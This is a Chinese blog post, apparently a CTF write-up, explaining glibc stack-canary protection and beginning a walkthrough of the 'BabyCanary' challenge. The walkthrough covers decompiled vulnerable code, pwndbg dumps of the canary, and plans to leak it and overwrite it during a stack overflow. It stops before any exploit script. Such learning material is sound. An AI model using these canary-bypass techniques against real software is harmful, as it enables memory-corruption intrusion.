<!DOCTYPE html>





<html lang="">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 3.9.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
  <link rel="alternate" href="/atom.xml" title="ZERO-A-ONE" type="application/atom+xml">

<link rel="stylesheet" href="/css/main.css?v=7.4.0">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">


<script id="hexo-configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '7.4.0',
    exturl: false,
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
    copycode: {"enable":false,"show_result":false,"style":null},
    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
    bookmark: {"enable":false,"color":"#222","save":"auto"},
    fancybox: false,
    mediumzoom: false,
    lazyload: false,
    pangu: false,
    algolia: {
      appID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    },
    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
    path: 'search.xml',
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    translation: {
      copy_button: 'Kopieren',
      copy_success: 'Kopiert',
      copy_failure: 'Kopieren fehlgeschlagen'
    },
    sidebarPadding: 40
  };
</script>

  <meta name="description" content="Canary直译就是金丝雀，为什么是叫金丝雀 17世纪，英国矿井工人发现，金丝雀对瓦斯这种气体十分敏感。空气中哪怕有极其微量的瓦斯，金丝雀也会停止歌唱；而当瓦斯含量超过一定限度时，虽然鲁钝的人类毫无察觉，金丝雀却早已毒发身亡。当时在采矿设备相对简陋的条件下，工人们每次下井都会带上一只金丝雀作为“瓦斯检测指标”，以便在危险状况下紧急撤离 由于 stack overflow 而引发的攻击非常普遍也非常">
<meta property="og:type" content="article">
<meta property="og:title" content="从BabyCanary入门Canary">
<meta property="og:url" content="http://yoursite.com/2019/09/18/┤╙BabyCanary╚δ├┼Canary/index.html">
<meta property="og:site_name" content="ZERO-A-ONE">
<meta property="og:description" content="Canary直译就是金丝雀，为什么是叫金丝雀 17世纪，英国矿井工人发现，金丝雀对瓦斯这种气体十分敏感。空气中哪怕有极其微量的瓦斯，金丝雀也会停止歌唱；而当瓦斯含量超过一定限度时，虽然鲁钝的人类毫无察觉，金丝雀却早已毒发身亡。当时在采矿设备相对简陋的条件下，工人们每次下井都会带上一只金丝雀作为“瓦斯检测指标”，以便在危险状况下紧急撤离 由于 stack overflow 而引发的攻击非常普遍也非常">
<meta property="og:locale" content="default">
<meta property="og:image" content="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E4%BB%8EBabyCanary%E5%85%A5%E9%97%A8Canary/canary_1122569b3258873874d61fd5bfc62fba.png">
<meta property="og:image" content="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E4%BB%8EBabyCanary%E5%85%A5%E9%97%A8Canary/canary_1d676e1ed18ade8675f112f61e39ab74.png">
<meta property="og:image" content="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E4%BB%8EBabyCanary%E5%85%A5%E9%97%A8Canary/canary_1acfdb1810a2876c78383f4a3a66a515.png">
<meta property="og:image" content="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E4%BB%8EBabyCanary%E5%85%A5%E9%97%A8Canary/canary_b151b13af2155fff6a842855cbbd4d07.png">
<meta property="og:updated_time" content="2019-09-19T03:31:38.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="从BabyCanary入门Canary">
<meta name="twitter:description" content="Canary直译就是金丝雀，为什么是叫金丝雀 17世纪，英国矿井工人发现，金丝雀对瓦斯这种气体十分敏感。空气中哪怕有极其微量的瓦斯，金丝雀也会停止歌唱；而当瓦斯含量超过一定限度时，虽然鲁钝的人类毫无察觉，金丝雀却早已毒发身亡。当时在采矿设备相对简陋的条件下，工人们每次下井都会带上一只金丝雀作为“瓦斯检测指标”，以便在危险状况下紧急撤离 由于 stack overflow 而引发的攻击非常普遍也非常">
<meta name="twitter:image" content="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E4%BB%8EBabyCanary%E5%85%A5%E9%97%A8Canary/canary_1122569b3258873874d61fd5bfc62fba.png">
  <link rel="canonical" href="http://yoursite.com/2019/09/18/┤╙BabyCanary╚δ├┼Canary/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome: false,
    isPost: true,
    isPage: false,
    isArchive: false
  };
</script>

  <title>从BabyCanary入门Canary | ZERO-A-ONE</title>
  








  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="default">
  <div class="container use-motion">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">ZERO-A-ONE</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Navigationsleiste an/ausschalten">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
      
      
      
        
        <li class="menu-item menu-item-home">
      
    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>

  </li>
      
      
      
        
        <li class="menu-item menu-item-archives">
      
    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>

  </li>
      <li class="menu-item menu-item-search">
        <a href="javascript:;" class="popup-trigger">
        
          <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Suche</a>
      </li>
    
  </ul>

</nav>
  <div class="site-search">
    <div class="popup search-popup">
    <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocorrect="off" autocapitalize="none"
           placeholder="Suche..." spellcheck="false"
           type="text" id="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result"></div>

</div>
<div class="search-pop-overlay"></div>

  </div>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
            

          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
     <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block post">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/18/┤╙BabyCanary╚δ├┼Canary/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">从BabyCanary入门Canary

          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2019-09-18 05:31:13 / Geändert am: 20:31:38" itemprop="dateCreated datePublished" datetime="2019-09-18T05:31:13-07:00">2019-09-18</time>
            </span>
          
            

            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p><strong>Canary</strong>直译就是金丝雀，为什么是叫金丝雀</p>
<p>17世纪，英国矿井工人发现，金丝雀对瓦斯这种气体十分敏感。空气中哪怕有极其微量的瓦斯，金丝雀也会停止歌唱；而当瓦斯含量超过一定限度时，虽然鲁钝的人类毫无察觉，金丝雀却早已毒发身亡。当时在采矿设备相对简陋的条件下，工人们每次下井都会带上一只金丝雀作为“瓦斯检测指标”，以便在危险状况下紧急撤离</p>
<p>由于 <strong>stack overflow</strong> 而引发的攻击非常普遍也非常古老, 相应地一种叫做 <strong>canary</strong> 的 <strong>mitigation</strong> 技术很早就出现在 <strong>glibc</strong> 里, 直到现在也作为系统安全的第一道防线存在。</p>
<p><strong>Canary</strong> 不管是实现还是设计思想都比较简单高效, 就是插入一个值, 在 <strong>stack overflow</strong> 发生的 高危区域的尾部, 当函数返回之时检测 <strong>canary</strong> 的值是否经过了改变, 以此来判断 <strong>stack/buffer overflow</strong> 是否发生.</p>
<p><strong>Canary</strong> 与 <strong>windows</strong> 下的 <strong>GS</strong> 保护都是防止栈溢出的有效手段，它的出现很大程度上防止了栈溢出的出现，并且由于它几乎并不消耗系统资源，所以现在成了 <strong>linux</strong> 下保护机制的标配</p>
<h2 id="Canary-原理"><a href="#Canary-原理" class="headerlink" title="Canary 原理"></a>Canary 原理</h2><h3 id="在-GCC-中使用-Canary"><a href="#在-GCC-中使用-Canary" class="headerlink" title="在 GCC 中使用 Canary"></a>在 GCC 中使用 Canary</h3><p>可以在 <strong>GCC</strong> 中使用以下参数设置 <strong>Canary</strong>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="line">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="line">-fstack-protector-strong</span><br><span class="line">-fstack-protector-explicit 只对有明确stack_protect attribute的函数开启保护</span><br><span class="line">-fno-stack-protector 禁用保护.</span><br></pre></td></tr></table></figure>

<h3 id="Canary-实现原理"><a href="#Canary-实现原理" class="headerlink" title="Canary 实现原理"></a>Canary 实现原理</h3><p>开启 <strong>Canary</strong> 保护的 <strong>stack</strong> 结构大概如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp =&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 =&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | 局部变量        |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure>

<p>当程序启用 <strong>Canary</strong> 编译后，在函数序言部分会取 <strong>fs</strong> 寄存器 <strong>0x28</strong> 处的值，存放在栈中 <strong>%ebp-0x8</strong> 的位置。 这个操作即为向栈中插入 <strong>Canary</strong> 值，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov    qword ptr [rbp - 8], rax</span><br></pre></td></tr></table></figure>

<p>在函数返回之前，会将该值取出，并与 <strong>fs:0x28</strong> 的值进行异或。如果异或的结果为 <strong>0</strong>，说明 <strong>canary</strong> 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">xor    rdx,QWORD PTR fs:0x28</span><br><span class="line">je     0x4005d7 &lt;main+65&gt;</span><br><span class="line">call   0x400460 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure>

<p>如果 <strong>canary</strong> 已经被非法修改，此时程序流程会走到 <code>__stack_chk_fail</code>。<code>__stack_chk_fail</code> 也是位于 <strong>glibc</strong> 中的函数，默认情况下经过 <strong>ELF</strong> 的延迟绑定，定义如下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">eglibc<span class="number">-2.19</span>/debug/stack_chk_fail.c</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">"stack smashing detected"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这意味可以通过劫持 <code>__stack_chk_fail</code>的 <strong>go</strong>t 值劫持流程或者利用 <code>__stack_chk_fail</code> 泄漏内容</p>
<p>进一步，对于 <strong>Linux</strong> 来说，<strong>fs</strong> 寄存器实际指向的是当前栈的 <strong>TLS</strong> 结构，<strong>fs:0x28</strong> 指向的正是 <strong>stack_guard</strong>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">                       thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="keyword">dtv_t</span> *dtv;</span><br><span class="line">  <span class="keyword">void</span> *self;       <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="keyword">int</span> multiple_threads;</span><br><span class="line">  <span class="keyword">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; <span class="keyword">tcbhead_t</span>;</span><br></pre></td></tr></table></figure>

<p>如果存在溢出可以覆盖位于 <strong>TLS</strong> 中保存的 <strong>Canary</strong> 值那么就可以实现绕过保护机制。</p>
<p>事实上，<strong>TLS</strong> 中的值由函数 <strong>security_init</strong> 进行初始化。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">security_init (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// _dl_random的值在进入这个函数的时候就已经由kernel写入.</span></span><br><span class="line">  <span class="comment">// glibc直接使用了_dl_random的值并没有给赋值</span></span><br><span class="line">  <span class="comment">// 如果不采用这种模式, glibc也可以自己产生随机数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//将_dl_random的最后一个字节设置为0x0</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置Canary的值到TLS中</span></span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//THREAD_SET_STACK_GUARD宏用于设置TLS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> THREAD_SET_STACK_GUARD(value) \</span></span><br><span class="line">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></pre></td></tr></table></figure>

<p>总的来说检测的机制是这样的：</p>
<p>1.程序从一个神奇的地方取出一个4（<strong>eax</strong>，32位系统）或8（<strong>rax</strong>，64位系统）节的值，在32位程序上，你可能会看到</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E4%BB%8EBabyCanary%E5%85%A5%E9%97%A8Canary/canary_1122569b3258873874d61fd5bfc62fba.png" alt></p>
<p>在64位上，你可能会看到</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E4%BB%8EBabyCanary%E5%85%A5%E9%97%A8Canary/canary_1d676e1ed18ade8675f112f61e39ab74.png" alt></p>
<p>放到栈上以后，<strong>eax</strong>中的副本也会被清空（<strong>xor eax,eax</strong>）</p>
<p>2.程序正常的走完了流程，到函数执行完的时候，程序会再次从那个神奇的地方把<strong>canary</strong>的值取出来，和之前放在栈上的<strong>canary</strong>进行比较，如果因为栈溢出什么的原因覆盖到了<strong>canary</strong>而导致<strong>canary</strong>发生了变化则直接终止程序</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E4%BB%8EBabyCanary%E5%85%A5%E9%97%A8Canary/canary_1acfdb1810a2876c78383f4a3a66a515.png" alt></p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E4%BB%8EBabyCanary%E5%85%A5%E9%97%A8Canary/canary_b151b13af2155fff6a842855cbbd4d07.png" alt></p>
<h2 id="BabyCanary"><a href="#BabyCanary" class="headerlink" title="BabyCanary"></a>BabyCanary</h2><p>我们先检查一下程序情况</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>可以得知开启了<strong>Canary</strong>防护和<strong>NX</strong>防护</p>
<p><strong>main</strong>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  sub_4006F9();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>sub_4006F9</strong>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">sub_4006F9</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"tell me your name:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"OK,%s,let start!\n"</span>, &amp;buf);</span><br><span class="line">  sub_400696();</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>sub_4006F9</strong>函数中使用<strong>read</strong>函数获取输入，然后使用<strong>printf</strong>函数直接输出，存在格式化字符串漏洞，可以泄露内存</p>
<p>大体思路就是通过格式化字符串读取<strong>canary</strong>的值，然后在栈溢出的<strong>padding</strong>块把<strong>canary</strong>所在位置的值用正确的<strong>canary</strong>替换，从而绕过<strong>canary</strong>的检测</p>
<p>观察得到Canary的生成代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004006F</span>9                 push    rbp</span><br><span class="line">.text:<span class="number">00000000004006F</span>A                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">00000000004006F</span>D                 sub     rsp, <span class="number">90</span>h</span><br><span class="line">.text:<span class="number">0000000000400704</span> ; <span class="number">5</span>:   v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">.text:<span class="number">0000000000400704</span>                 mov     rax, fs:<span class="number">28</span>h</span><br><span class="line">.text:<span class="number">000000000040070</span>D                 mov     [rbp+var_8], rax</span><br><span class="line">.text:<span class="number">0000000000400711</span> ; <span class="number">6</span>:   <span class="built_in">puts</span>(<span class="string">"tell me your name:"</span>);</span><br><span class="line">.text:<span class="number">0000000000400711</span>                 xor     eax, eax</span><br></pre></td></tr></table></figure>

<p>我们使用<strong>GDB</strong>调试，先下一个断点到<strong>0x00000000004006F9</strong>，查看一下汇编情况</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">► 0x4006f9    push   rbp</span><br><span class="line">  0x4006fa    mov    rbp, rsp</span><br><span class="line">  0x4006fd    sub    rsp, 0x90</span><br><span class="line">  0x400704    mov    rax, qword ptr fs:[0x28]</span><br><span class="line">  0x40070d    mov    qword ptr [rbp - 8], rax</span><br><span class="line">  0x400711    xor    eax, eax</span><br><span class="line">  0x400713    mov    edi, 0x400824</span><br><span class="line">  0x400718    call   0x400560</span><br><span class="line">  0x40071d    lea    rax, [rbp - 0x90]</span><br><span class="line">  0x400724    mov    edx, 0x100</span><br><span class="line">  0x400729    mov    rsi, rax</span><br></pre></td></tr></table></figure>

<p>一直单步运行直至异或eax寄存器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  0x4006f9    push   rbp</span><br><span class="line">  0x4006fa    mov    rbp, rsp</span><br><span class="line">  0x4006fd    sub    rsp, 0x90</span><br><span class="line">  0x400704    mov    rax, qword ptr fs:[0x28]</span><br><span class="line">  0x40070d    mov    qword ptr [rbp - 8], rax</span><br><span class="line">► 0x400711    xor    eax, eax</span><br><span class="line">  0x400713    mov    edi, 0x400824</span><br><span class="line">  0x400718    call   0x400560</span><br><span class="line">  0x40071d    lea    rax, [rbp - 0x90]</span><br><span class="line">  0x400724    mov    edx, 0x100</span><br><span class="line">  0x400729    mov    rsi, rax</span><br></pre></td></tr></table></figure>

<p>查看此时栈上的情况</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx $rbp</span><br><span class="line">0x7fffffffde40:	0x00007fffffffde50	0x000000000040077e</span><br><span class="line">0x7fffffffde50:	0x0000000000400790	0x00007ffff7a2d830</span><br><span class="line">0x7fffffffde60:	0x00007fffffffdf38	0x00007fffffffdf38</span><br><span class="line">0x7fffffffde70:	0x00000001f7b99608	0x0000000000400770</span><br><span class="line">0x7fffffffde80:	0x0000000000000000	0x5dbdf3d3bbac9a43</span><br><span class="line">0x7fffffffde90:	0x00000000004005a0	0x00007fffffffdf30</span><br><span class="line">0x7fffffffdea0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fffffffdeb0:	0xa2420cac084c9a43	0xa2421c161b5c9a43</span><br><span class="line">0x7fffffffdec0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fffffffded0:	0x0000000000000000	0x00007fffffffdf48</span><br></pre></td></tr></table></figure>

<p>得知canary的值在<code>[rbp - 8]</code>处，则我们直接查看这里的值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope $rbp-8</span><br><span class="line">00:0000│      0x7fffffffde38 ◂— 0xca64b11c5d706100</span><br><span class="line">01:0008│ rbp  0x7fffffffde40 —▸ 0x7fffffffde50 —▸ 0x400790 ◂— push   r15</span><br><span class="line">02:0010│      0x7fffffffde48 —▸ 0x40077e ◂— mov    eax, 0</span><br><span class="line">03:0018│      0x7fffffffde50 —▸ 0x400790 ◂— push   r15</span><br><span class="line">04:0020│      0x7fffffffde58 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line">05:0028│      0x7fffffffde60 —▸ 0x7fffffffdf38 —▸ 0x7fffffffe2a9 ◂— &apos;/home/syc/Documents/challange/babycanary/babycanary&apos;</span><br><span class="line">... ↓</span><br><span class="line">07:0038│      0x7fffffffde70 ◂— 0x1f7b99608</span><br></pre></td></tr></table></figure>

<p>可以得知<strong>Canary</strong>的值就是 <strong>0xca64b11c5d706100</strong></p>
<p>但是问题是我们发现这题其实并不能使用格式化字符串实现泄露<strong>Canary</strong>的地址，因为它使用的是<strong>Read</strong>函数，并不会在后面添加<strong>“0/”</strong>截断，无法被解析也就无法利用格式化字符串漏洞。我们只能使用栈溢出直接输出<strong>Canary</strong>函数</p>
<p>我们先构造一个长度为<strong>90</strong>的字符串先尝试一下，下一个断点在<strong>0x0000000000400736</strong>(<strong>printf</strong>函数)</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Documents/challange$ python pattern.py create 128</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae</span><br></pre></td></tr></table></figure>

<p>然后运行在断点处查看栈结构</p>
